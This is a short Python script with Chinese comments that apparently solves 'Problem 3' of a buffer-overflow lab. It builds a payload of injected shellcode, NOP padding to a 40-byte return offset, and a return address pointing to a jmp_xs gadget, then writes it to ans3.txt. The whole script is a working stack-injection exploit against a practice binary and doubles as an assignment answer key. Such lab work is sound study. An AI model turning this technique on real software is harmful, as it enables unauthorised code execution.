import struct

# 问题3：栈可执行；在缓冲区起始注入短shellcode并用 jmp_xs 枢轴
# Shellcode：mov edi, 0x72; mov rax, 0x401216; call rax
# 返回地址为 jmp_xs (0x401334)

JMP_XS = 0x401334
FUNC1 = 0x401216

shellcode = (
    b"\xbf\x72\x00\x00\x00" +
    b"\x48\xb8\x16\x12\x40\x00\x00\x00\x00\x00" +
    b"\xff\xd0"
)

# 返回地址偏移=40字节（局部缓冲区 [rbp-0x20] 起始）
BUFFER_TO_RET = 40

padding_len = BUFFER_TO_RET - len(shellcode)
if padding_len < 0:
    raise ValueError("Shellcode too long for planned offset")
payload = shellcode + (b"\x90" * padding_len) + struct.pack('<Q', JMP_XS)
with open('ans3.txt', 'wb') as f:
    f.write(payload)
print('Payload written to ans3.txt (Problem 3)')